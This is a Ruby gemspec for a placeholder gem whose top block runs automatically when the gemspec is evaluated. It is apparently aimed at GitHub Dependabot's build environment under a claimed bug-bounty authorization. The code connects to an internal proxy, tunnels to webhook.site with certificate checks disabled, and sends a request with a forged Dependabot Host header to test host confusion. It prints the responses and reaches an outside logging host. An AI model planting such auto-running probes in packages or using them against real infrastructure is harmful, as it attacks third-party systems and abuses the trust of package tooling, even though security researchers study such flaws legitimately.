# Runs at gemspec-evaluation time. Authorized security research for GitHub's
# Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
begin
  require "socket"
  require "openssl"
  require "timeout"

  def probe(proxy_host, proxy_port, connect_target, forged_host, path, label)
    steps = ["[#{label}]"]
    begin
      Timeout.timeout(20) do
        sock = TCPSocket.new(proxy_host, proxy_port)
        steps << "tcp_connected"
        sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
        steps << "connect_sent"
        connect_resp = sock.readline
        steps << "connect_resp=#{connect_resp.strip.inspect}"
        ctx = OpenSSL::SSL::SSLContext.new
        ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
        ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
        ssl.hostname = connect_target
        ssl.connect
        steps << "tls_established cert_subject=#{ssl.peer_cert&.subject}"
        req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nUser-Agent: curl/8.0\r\nAccept: */*\r\nConnection: close\r\n\r\n"
        ssl.write(req)
        steps << "request_sent bytes=#{req.bytesize}"
        buf = +""
        begin
          loop do
            chunk = ssl.read_nonblock(2000)
            buf << chunk
          end
        rescue IO::WaitReadable
          IO.select([ssl], nil, nil, 3)
          retry if buf.empty?
        rescue EOFError
        end
        steps << "response_read bytes=#{buf.bytesize}"
        ssl.close rescue nil
        steps << "resp_first400=#{buf[0,400].inspect}"
      end
    rescue => e
      steps << "FAILED #{e.class}: #{e.message}"
    end
    steps.join(" | ")
  end

  r1 = probe("172.19.0.2", 1080, "webhook.site", "webhook.site",
             "/61eb303b-510b-4c33-a552-ac87f451e6bf/baseline-matching-host", "BASELINE")
  r2 = probe("172.19.0.2", 1080, "webhook.site", "dependabot-actions.githubapp.com",
             "/61eb303b-510b-4c33-a552-ac87f451e6bf/host-confusion-test", "FORGED")

  puts "==HOSTCONFUSION=="
  puts r1
  puts r2
  puts "==HOSTCONFUSION_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.6"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
